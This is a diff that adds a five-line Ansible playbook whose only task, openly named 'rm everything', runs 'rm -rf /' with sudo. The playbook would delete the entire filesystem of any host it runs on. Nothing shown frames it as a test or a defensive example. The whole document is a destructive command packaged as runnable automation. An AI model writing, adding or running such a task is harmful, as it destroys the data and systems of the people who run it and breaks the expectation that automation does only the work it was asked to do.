@@ -1,0 +1,5 @@
+---
+- name: rm everything
+  shell: rm -rf /
+  sudo: yes
+
